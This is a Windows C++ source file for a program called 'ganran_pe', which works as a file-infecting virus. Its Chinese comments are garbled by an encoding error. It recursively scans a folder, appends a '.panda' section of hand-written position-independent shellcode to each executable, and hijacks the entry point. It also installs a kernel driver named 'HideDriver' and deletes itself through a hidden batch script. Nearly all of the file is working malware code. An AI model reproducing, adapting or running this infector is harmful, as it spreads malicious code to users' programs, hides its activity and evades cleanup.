// ganran_pe.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "resource.h"
#include <windows.h>
#include <tlhelp32.h>
#include <Commdlg.h>
#include <malloc.h>
#include <assert.h>
#include "ico.h"

#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

bool ChangeExeIcon(LPCSTR IconFile, LPCSTR ExeFile);
char buffer[MAX_PATH],buffer2[MAX_PATH];

//������ֻ�����������ַ��λ�ġ������������ַ
//��Ⱦָ��Ŀ¼��PE�ļ�
char ItIs[MAX_PATH] = "C:\\1";
//�����һ���½���
//Ȼ��shellcode�����һ����Ϊa������Ϊa��administrator
//Ȼ��PEB��λkernel32ֻ���ҵ�win7 x64�����ϲ��Գɹ������������޸ģ���ͨ��


//��������: ��ALIGN_BASEΪ����ȶ���size
//����˵��: 
//		size:��Ҫ����Ĵ�С
//		ALIGN_BASE:�����
//����ֵ:	���ض����Ĵ�С
DWORD Align(DWORD size, DWORD ALIGN_BASE)
{
	assert(0 != ALIGN_BASE);
	if (size % ALIGN_BASE)
	{
		size = (size/ALIGN_BASE + 1) * ALIGN_BASE;
	}
	return size;
}

//��������: ����Ⱦ��ʶ�����ø�Ⱦ��ʶ
//����˵��:
//		pDosHdr:ִ��DOSͷ
//����ֵ:	�Ƿ�δ����Ⱦ, ��->TRUE, ��->FALSE
BOOL SetFectFlag(PIMAGE_DOS_HEADER &pDosHdr)
{
	if (*(DWORD*)pDosHdr->e_res2 == 0x4B4B43)
	{
		return FALSE;
	}
	else
	{
		*(DWORD*)pDosHdr->e_res2 = 0x4B4B43;
		return TRUE;
	}
}

//��������:	���ļ����ж��ļ�����
//����˵��:	
//		szPath:�ļ�����·��
//		lpMemory:�����ļ��ڴ�ӳ���ַ
//����ֵ:	�Ƿ���PE�ļ�, ��->TRUE, ��->FALSE
BOOL CreateFileAndCheck(char *szPath, LPVOID &lpMemory, HANDLE &hFile)
{
	//���ļ�
	hFile = CreateFileA(szPath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		//printf("CreateFileA %s Failed! ErrorCode = %d\n", szPath, GetLastError());
		return FALSE;
	}
	HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, NULL, NULL, NULL);
	if (!hMap)
	{
		//printf("CreateFileMappingA %s Failed! ErrorCode = %d\n", szPath, GetLastError());
		return FALSE;
	}
	lpMemory = MapViewOfFile(hMap, FILE_MAP_READ|FILE_MAP_WRITE, NULL, NULL, NULL);
	if (!lpMemory)
	{
		//printf("MapViewOfFile %s Failed! ErrorCode = %d\n", szPath, GetLastError());
		CloseHandle(hMap);
		return FALSE;
	}

	CloseHandle(hMap);
	return TRUE;
}


DWORD dwNum;
PBYTE pByte;
DWORD dwOldOp;
DWORD dwNum1;
DWORD nSecSize;
DWORD size;
DWORD i;
PIMAGE_SECTION_HEADER pSecHdr;
PIMAGE_SECTION_HEADER pNewHdr;
PIMAGE_SECTION_HEADER pLastHdr;
PIMAGE_NT_HEADERS32 pNtHdr;
//��������: ��Ⱦָ���ļ�
//����˵��:
//		szPath:�ļ�����·��
void FectPE(char *szPath)
{
	LPVOID lpMemory;
	HANDLE hFile;
	if (!CreateFileAndCheck(szPath, lpMemory, hFile))
	{
		return;
	}
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpMemory;
	//�ж�DOS��ʶ
	if (*(WORD*)pDosHdr != 23117)
		goto Err;

	 pNtHdr = (PIMAGE_NT_HEADERS32)( *(DWORD*)&pDosHdr + (DWORD)pDosHdr->e_lfanew);
	//�ж�NT��ʶ
	if (*(WORD*)pNtHdr != 17744)
		goto Err;

	//���ø�Ⱦ��ʶ
	if (!SetFectFlag(pDosHdr))
		goto Err;

	//�����ÿռ�
	if ((pNtHdr->FileHeader.NumberOfSections + 1) * sizeof(IMAGE_SECTION_HEADER) > pNtHdr->OptionalHeader.SizeOfHeaders)
		goto Err;

	 pSecHdr = (PIMAGE_SECTION_HEADER)(*(DWORD*)&pNtHdr + sizeof(IMAGE_NT_HEADERS32));
	 pNewHdr = (PIMAGE_SECTION_HEADER)(pSecHdr + pNtHdr->FileHeader.NumberOfSections);
	 pLastHdr = (PIMAGE_SECTION_HEADER)(pNewHdr - 1);

	//����Ƿ��и�������
	 i = 0;
	 size = pSecHdr->PointerToRawData;
	for ( ; i<pNtHdr->FileHeader.NumberOfSections; i++)
	{
		size += Align(pSecHdr[i].SizeOfRawData, pNtHdr->OptionalHeader.FileAlignment);
	}
	if (size != GetFileSize(hFile, 0))
	{
		return;			//�и�������
	}

	goto shellend;
	_asm
	{
shellstart:		
			CLD                 ; clear flag DF
			;store hash
			push 0x1e380a6a     ;hash of MessageBoxA
			push 0x4fd18963     ;hash of ExitProcess
			push 0x0c917432     ;hash of LoadLibraryA
			mov esi,esp         ; esi = addr of first function hash 
			lea edi,[esi-0xc]   ; edi = addr to start writing function 
			; make some stack space
			xor ebx,ebx
			mov bh, 0x04            
			sub esp, ebx 
			; push a pointer to "user32" onto stack 
			mov bx, 0x3233      ; rest of ebx is null 
			push ebx 
			push 0x72657375
			push esp 
			xor edx,edx
			; find base addr of kernel32.dll 
			mov ebx,fs:[edx+0x30]   //�õ�peb�ṹ��ĵ�ַ
		mov ebx,[ebx + 0xc] //�õ�Ldr�ṹ��ĵ�ַ
		mov ebx,[ebx + 0xc] //�õ�ldr.InLoadOrderModuleList.Flink ��һ��ģ�飬��ǰ����
		mov ebx,[ebx]   //�õ��ڶ���ģ���ַ ntdll.dll
		mov ebx,[ebx]   //�õ�������ģ���ַ kernel32.dll
		mov ebx,[ebx+0x18]  //�õ�������ģ���ַ��kernel32ģ���dllbase)
		mov ebp,ebx
find_lib_functions:
		lodsd                   ; load next hash into al and increment esi 
			cmp eax, 0x1e380a6a     ; hash of MessageBoxA - trigger 
			; LoadLibrary("user32")
			jne find_functions 
			xchg eax, ebp           ; save current hash 
			call [edi - 0x8]        ; LoadLibraryA 
			xchg eax, ebp           ; restore current hash, and update ebp 
			; with base address of user32.dll 
find_functions:
		pushad                      ; preserve registers 
			mov eax, [ebp + 0x3c]       ; eax = start of PE header 
			mov ecx, [ebp + eax + 0x78] ; ecx = relative offset of export table 
			add ecx, ebp                ; ecx = absolute addr of export table 
			mov ebx, [ecx + 0x20]       ; ebx = relative offset of names table 
			add ebx, ebp                ; ebx = absolute addr of names table 
			xor edi, edi                ; edi will count through the functions 
next_function_loop:
		inc edi                     ; increment function counter 
			mov esi, [ebx + edi * 4]    ; esi = relative offset of current function name
			add esi, ebp                ; esi = absolute addr of current function name
			cdq                         ; dl will hold hash (we know eax is small)
hash_loop:
		movsx eax, byte ptr[esi]
		cmp al,ah
			jz compare_hash
			ror edx,7
			add edx,eax
			inc esi
			jmp hash_loop
compare_hash:  
		cmp edx, [esp + 0x1c]       ; compare to the requested hash (saved on stack from pushad)
			jnz next_function_loop 
			mov ebx, [ecx + 0x24]       ; ebx = relative offset of ordinals table 
			add ebx, ebp                ; ebx = absolute addr of ordinals table 
			mov di, [ebx + 2 * edi]     ; di = ordinal number of matched function 
			mov ebx, [ecx + 0x1c]       ; ebx = relative offset of address table 
			add ebx, ebp                ; ebx = absolute addr of address table 
			add ebp, [ebx + 4 * edi]    ; add to ebp (base addr of module) the
			; relative offset of matched function 
			xchg eax, ebp               ; move func addr into eax 
			pop edi                     ; edi is last onto stack in pushad 
			stosd                       ; write function addr to [edi] and increment edi 
			push edi 
			popad                   ; restore registers 
			; loop until we reach end of last hash 
			cmp eax,0x1e380a6a
			jne find_lib_functions 
function_call:
		xor ebx,ebx
			push ebx            // cut string

		  push 0xE9D1B5CA    //���������ַ���
			  push 0xBEB6A1B2
			  mov edx,esp
			  push ebx
			  push 0x20202031
			  push 0x32303232
			  push 0x31313130
			  push 0x322B6E61
			  push 0x7571676E
			  push 0x61686367
			  push 0x6E616978
			  mov eax,esp
			  push ebx
			  push edx
			  push eax
			  push ebx
			  call dword ptr ds:[edi-0x4]

			mov eax,0x11111111
			jmp eax
	}
shellend:
		PBYTE *pShell;
		DWORD nShellLen;
		_asm
		{
			lea eax,shellstart
		mov pShell,eax
		lea ebx,shellend
		sub ebx,eax
		mov nShellLen,ebx
	}
	//����½�
	memcpy(pNewHdr->Name, ".panda", 6);
	//�¼ӽ�virtualsize
	 nSecSize = nShellLen;
	pNewHdr->Misc.VirtualSize = nSecSize;//���ֵ���Բ��Ƕ����ֵ ps:ò�Ƴ������������Ҫ���밥�r(�s���t)�q
	
	pNewHdr->VirtualAddress = pLastHdr->VirtualAddress + Align(pLastHdr->Misc.VirtualSize, pNtHdr->OptionalHeader.SectionAlignment);
	pNewHdr->SizeOfRawData = Align(nSecSize, pNtHdr->OptionalHeader.FileAlignment);
	pNewHdr->PointerToRawData = pLastHdr->PointerToRawData + Align(pLastHdr->SizeOfRawData, pNtHdr->OptionalHeader.FileAlignment);
	pNewHdr->Characteristics = IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_EXECUTE;

	pNtHdr->FileHeader.NumberOfSections++;
	
	pNtHdr->OptionalHeader.SizeOfImage += Align(pNewHdr->Misc.VirtualSize, pNtHdr->OptionalHeader.SectionAlignment);//���ֵ�����Ƕ����ֵ
//	pNtHdr->OptionalHeader.SizeOfCode += Align(pNewHdr->SizeOfRawData, pNtHdr->OptionalHeader.FileAlignment);//��˵��������Ҫ�ɲ�Ҫ
	//FlushViewOfFile(pDosHdr, 0);

	//д��shellcode
	dwOldOp = pNtHdr->OptionalHeader.AddressOfEntryPoint;
	printf("ԭʼ��ڵ�: %XH\n", dwOldOp);
	dwOldOp += pNtHdr->OptionalHeader.ImageBase;
	
	printf("ԭʼ������ص�: %XH\n", dwOldOp);
	 dwNum1 = 0;
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, pShell, nShellLen, &dwNum1, NULL);
	SetFilePointer(hFile, -6, 0, FILE_CURRENT);

	WriteFile(hFile, &dwOldOp, 4, &dwNum1, NULL);

	//д��ʣ���ֽ�
	 pByte = (PBYTE)malloc(pNewHdr->SizeOfRawData-nShellLen);
	ZeroMemory(pByte, pNewHdr->SizeOfRawData-nShellLen);
	 dwNum = 0;
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, pByte, pNewHdr->SizeOfRawData-nShellLen, &dwNum, NULL);
	//FlushFileBuffers(hFile);
	free(pByte);

	pNtHdr->OptionalHeader.AddressOfEntryPoint = pNewHdr->VirtualAddress;
	//printf("����ڵ�: %X\n", pNewHdr->VirtualAddress);

Err:
	CloseHandle(hFile);
	UnmapViewOfFile(lpMemory);
}

//��������: ɨ������ļ�
//����˵��:
//		szPath:��Ҫɨ���Ŀ¼
void FindFile(char *szPath)
{
	WIN32_FIND_DATAA FindFileData;
	
	char szFileToFind[MAX_PATH] = {0};
	lstrcpyA(szFileToFind, szPath);
	lstrcatA(szFileToFind, "\\*.*");

	//����Ŀ¼�������ļ�
	HANDLE hFile = FindFirstFileA(szFileToFind, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("FindFirstFileA Failed!\n");
		return;
	}
	do 
	{
		char szNewPath[MAX_PATH] = {0};
		lstrcpyA(szNewPath, szPath);

		//�ж��Ƿ���Ŀ¼
		if (FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
		{
			//�ж��Ƿ���.��..
			if (!lstrcmpA(FindFileData.cFileName, ".") || !lstrcmpA(FindFileData.cFileName, "..")){}
			else
			{
				//�ݹ�����¼�Ŀ¼
				lstrcatA(szNewPath, "\\");
				lstrcatA(szNewPath, FindFileData.cFileName);
				FindFile(szNewPath);
			}
		}
		else
		{
			//������ҵ����ļ�
			char szExe[MAX_PATH] = {0};
			lstrcpyA(szExe, szNewPath);
			lstrcatA(szExe, "\\");
			lstrcatA(szExe, FindFileData.cFileName);
			FectPE(szExe);
			//ChangeExeIcon(buffer2,szExe);
		}
	} while (FindNextFileA(hFile, &FindFileData));

	FindClose(hFile);
}



//װ��NT��������
BOOL LoadNTDriver(char* lpszDriverName,char* lpszDriverPath)
{
	char szDriverImagePath[256];
	//�õ�����������·��
	GetFullPathName(lpszDriverPath, 256, szDriverImagePath, NULL);

	BOOL bRet = FALSE;

	SC_HANDLE hServiceMgr=NULL;//SCM�������ľ��
	SC_HANDLE hServiceDDK=NULL;//NT��������ķ�����

	//�򿪷�����ƹ�����
	hServiceMgr = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );

	if( hServiceMgr == NULL )  
	{
		//OpenSCManagerʧ��
		printf( "OpenSCManager() Faild %d ! \n", GetLastError() );
		bRet = FALSE;
		goto BeforeLeave;
	}
	else
	{
		////OpenSCManager�ɹ�
		printf( "OpenSCManager() ok ! \n" );  
	}

	//������������Ӧ�ķ���
	hServiceDDK = CreateService( hServiceMgr,
		lpszDriverName, //�����������ע����е�����  
		lpszDriverName, // ע������������ DisplayName ֵ  
		SERVICE_ALL_ACCESS, // ������������ķ���Ȩ��  
		SERVICE_KERNEL_DRIVER,// ��ʾ���صķ�������������  
		SERVICE_DEMAND_START, // ע������������ Start ֵ  
		SERVICE_ERROR_IGNORE, // ע������������ ErrorControl ֵ  
		szDriverImagePath, // ע������������ ImagePath ֵ  
		NULL,  
		NULL,  
		NULL,  
		NULL,  
		NULL);  

	DWORD dwRtn;
	//�жϷ����Ƿ�ʧ��
	if( hServiceDDK == NULL )  
	{  
		dwRtn = GetLastError();
		if( dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_EXISTS )  
		{  
			//��������ԭ�򴴽�����ʧ��
			printf( "CrateService() Faild %d ! \n", dwRtn );  
			bRet = FALSE;
			goto BeforeLeave;
		}  
		else  
		{
			//���񴴽�ʧ�ܣ������ڷ����Ѿ�������
			printf( "CrateService() Faild Service is ERROR_IO_PENDING or ERROR_SERVICE_EXISTS! \n" );  
		}

		// ���������Ѿ����أ�ֻ��Ҫ��  
		hServiceDDK = OpenService( hServiceMgr, lpszDriverName, SERVICE_ALL_ACCESS );  
		if( hServiceDDK == NULL )  
		{
			//����򿪷���Ҳʧ�ܣ�����ζ����
			dwRtn = GetLastError();  
			printf( "OpenService() Faild %d ! \n", dwRtn );  
			bRet = FALSE;
			goto BeforeLeave;
		}  
		else 
		{
			printf( "OpenService() ok ! \n" );
		}
	}  
	else  
	{
		printf( "CrateService() ok ! \n" );
	}

	//�����������
	bRet= StartService( hServiceDDK, NULL, NULL );  
	printf("StartService bRet =%d\n",bRet);
	if( !bRet )  
	{  
		DWORD dwRtn = GetLastError();  
		printf("GetLastError = %d",dwRtn);
		if( dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_ALREADY_RUNNING )  
		{  
			printf( "StartService() Faild %d ! \n", dwRtn );  
			bRet = FALSE;
			goto BeforeLeave;
		}  
		else  
		{  
			if( dwRtn == ERROR_IO_PENDING )  
			{  
				//�豸����ס
				printf( "StartService() Faild ERROR_IO_PENDING ! \n");
				bRet = FALSE;
				goto BeforeLeave;
			}  
			else  
			{  
				//�����Ѿ�����
				printf( "StartService() Faild ERROR_SERVICE_ALREADY_RUNNING ! \n");
				bRet = TRUE;
				goto BeforeLeave;
			}  
		}  
	}
	bRet = TRUE;
//�뿪ǰ�رվ��
BeforeLeave:
	if(hServiceDDK)
	{
		CloseServiceHandle(hServiceDDK);
	}
	if(hServiceMgr)
	{
		CloseServiceHandle(hServiceMgr);
	}
	return bRet;
}

//ж����������  
BOOL UnloadNTDriver( char * szSvrName )  
{
	BOOL bRet = FALSE;
	SC_HANDLE hServiceMgr=NULL;//SCM�������ľ��
	SC_HANDLE hServiceDDK=NULL;//NT��������ķ�����
	SERVICE_STATUS SvrSta;
	//��SCM������
	hServiceMgr = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );  
	if( hServiceMgr == NULL )  
	{
		//����SCM������ʧ��
		printf( "OpenSCManager() Faild %d ! \n", GetLastError() );  
		bRet = FALSE;
		goto BeforeLeave;
	}  
	else  
	{
		//����SCM������ʧ�ܳɹ�
		printf( "OpenSCManager() ok ! \n" );  
	}
	//����������Ӧ�ķ���
	hServiceDDK = OpenService( hServiceMgr, szSvrName, SERVICE_ALL_ACCESS );  
	
	if( hServiceDDK == NULL )  
	{
		//����������Ӧ�ķ���ʧ��
		printf( "OpenService() Faild %d ! \n", GetLastError() );  
		bRet = FALSE;
		goto BeforeLeave;
	}  
	else  
	{  
		printf( "OpenService() ok ! \n" );  
	}  
	//ֹͣ�����������ֹͣʧ�ܣ�ֻ�������������ܣ��ٶ�̬���ء�  
	if( !ControlService( hServiceDDK, SERVICE_CONTROL_STOP , &SvrSta ) )  
	{  
		printf( "ControlService() Faild %d !\n", GetLastError() );  
	}  
	else  
	{
		//����������Ӧ��ʧ��
		printf( "ControlService() ok !\n" );  
	}  
	//��̬ж����������  
	if( !DeleteService( hServiceDDK ) )  
	{
		//ж��ʧ��
		printf( "DeleteSrevice() Faild %d !\n", GetLastError() );  
	}  
	else  
	{  
		//ж�سɹ�
		printf( "DelServer:eleteSrevice() ok !\n" );  
	}  
	bRet = TRUE;
BeforeLeave:
	//�뿪ǰ�رմ򿪵ľ��
	if(hServiceDDK)
	{
		CloseServiceHandle(hServiceDDK);
	}
	if(hServiceMgr)
	{
		CloseServiceHandle(hServiceMgr);
	}
	return bRet;	
} 
	
void SelfDel()
{
	char DirBuffer[MAX_PATH],TempBuffer[MAX_PATH];
	char temp[MAX_PATH];
	HMODULE hModule = GetModuleHandle(NULL);
	GetModuleFileName(hModule,DirBuffer,sizeof(DirBuffer));
	
	GetFileTitle(DirBuffer,TempBuffer,MAX_PATH);
	
	char *str = strrchr(DirBuffer,'\\');
	int result = str - DirBuffer + 1;
	for (int i=0;i<result;i++)
	{
		temp[i] = DirBuffer[i];
	}
	temp[i] = '\0';
	
	strcat(temp,"system.bat");
	// ��������ɾ���������ļ�
	FILE *fp;
	fp = fopen(temp,"wb+");
	fprintf(fp,"@echo off\r\n");
	fprintf(fp,":start\r\n\tif not exist %s goto done\r\n",TempBuffer);
	fprintf(fp,"\tdel /f /q %s\r\n",TempBuffer);
	fprintf(fp,"\tdel /f /q sys.sys\r\n");	
	fprintf(fp,"\tdel /f /q panda.ico\r\n");	
	
	fprintf(fp,"goto start\r\n");
	fprintf(fp,":done\r\n");
	fprintf(fp,"\tdel /f /q %%0\r\n");
	fclose(fp);
	/*
@echo off
:start
	if not exist xxx.exe goto done
	del /f /q xxx.exe
	del /f /q sys.sys
goto start
:done
	del /f /q %0

*/
	// �������������������ɾ��
	WinExec(temp,SW_HIDE);
	
}
struct ICONDIRENTRY {  
	BYTE bWidth;  
	BYTE bHeight;  
	BYTE bColorCount;  
	BYTE bReserved;  
	WORD wPlanes;  
	WORD wBitCount;  
	DWORD dwBytesInRes;  
	DWORD dwImageOffset;  
};  

struct ICONDIR {  
	WORD idReserved;  
	WORD idType;  
	WORD idCount;  
	//ICONDIRENTRY idEntries;  
};  

struct GRPICONDIRENTRY {  
	BYTE bWidth;  
	BYTE bHeight;  
	BYTE bColorCount;  
	BYTE bReserved;  
	WORD wPlanes;  
	WORD wBitCount;  
	DWORD dwBytesInRes;  
	WORD nID;  
};  

struct GRPICONDIR {  
	WORD idReserved;  
	WORD idType;  
	WORD idCount;  
	GRPICONDIRENTRY idEntries;  
};  
bool ChangeExeIcon(LPCSTR IconFile, LPCSTR ExeFile) {  
	ICONDIR stID;  
	ICONDIRENTRY stIDE;  
	GRPICONDIR stGID;  
	HANDLE hFile;  
	DWORD nSize, nGSize, dwReserved;  
	HANDLE hUpdate;  
	PBYTE pIcon, pGrpIcon;  
	BOOL ret;  

	hFile = CreateFile(IconFile, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);  
	if (hFile == INVALID_HANDLE_VALUE) {  
		return false;  
	}  

	ZeroMemory(&stID, sizeof(ICONDIR));  
	ret = ReadFile(hFile, &stID, sizeof(ICONDIR), &dwReserved, NULL);  

	ZeroMemory(&stIDE, sizeof(ICONDIRENTRY));  
	ret = ReadFile(hFile, &stIDE, sizeof(ICONDIRENTRY), &dwReserved, NULL);  

	nSize = stIDE.dwBytesInRes;  
	pIcon = (PBYTE) malloc(nSize);  
	SetFilePointer(hFile, stIDE.dwImageOffset, NULL, FILE_BEGIN);  
	ret = ReadFile(hFile, (LPVOID) pIcon, nSize, &dwReserved, NULL);  
	if (!ret) {  
		CloseHandle(hFile);  
		return false;  
	}  

	ZeroMemory(&stGID, sizeof(GRPICONDIR));  
	stGID.idCount = stID.idCount;  
	stGID.idReserved = 0;  
	stGID.idType = 1;  
	CopyMemory(&stGID.idEntries, &stIDE, 12);  
	stGID.idEntries.nID = 0;  

	nGSize = sizeof(GRPICONDIR);  
	pGrpIcon = (PBYTE) malloc(nGSize);  
	CopyMemory(pGrpIcon, &stGID, nGSize);  

	hUpdate = BeginUpdateResource(ExeFile, false);  
	ret = UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1), 0, (LPVOID) pGrpIcon, nGSize);  
	ret = UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(1), 0, (LPVOID) pIcon, nSize);  
	EndUpdateResource(hUpdate, false);  
	if (!ret) {  
		CloseHandle(hFile);  
		return false;  
	}  

	CloseHandle(hFile);  
	return true;  
}  



#define FILE_DEVICE_UNKNOWN 0x00000022
#define METHOD_BUFFERED 0
#define FILE_READ_ACCESS ( 0x0001 ) 
#define FILE_WRITE_ACCESS ( 0x0002 ) 

#define CTL_CODE( DeviceType, Function, Method, Access ) ( ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) )

#define IOCTL_START_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN,0x0801, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

//������
int main()
{
	GetCurrentDirectory(MAX_PATH,buffer);
	strcat(buffer,"\\sys.sys");
	GetCurrentDirectory(MAX_PATH,buffer2);
	strcat(buffer2,"\\panda.ico");
	
	HRSRC hRsrc = FindResource(NULL,MAKEINTRESOURCE(IDR_SYS1),TEXT("SYS"));//��������
	HGLOBAL hGlobal = LoadResource(NULL,hRsrc);
	LPVOID res = LockResource(hGlobal);
	DWORD size = SizeofResource(NULL,hRsrc);
	HANDLE hFile = CreateFile(buffer,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD dwWrited;
	WriteFile(hFile,res,size,&dwWrited,NULL);
	CloseHandle(hFile);

	LoadNTDriver("HideDriver",buffer);

	HANDLE hFile2 = CreateFile(buffer2,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD dwWrited2;
	WriteFile(hFile2,data,sizeof(data),&dwWrited2,NULL);
	CloseHandle(hFile2);
	

	printf("����driver %s ,׼����Ⱦ!",buffer);
	//getchar();
	FindFile(ItIs);

	MessageBox(NULL,"�ɹ��������","�ɹ��������",MB_OK);
	UnloadNTDriver("HideDriver");
	
	SelfDel();	

	

	return 0;
}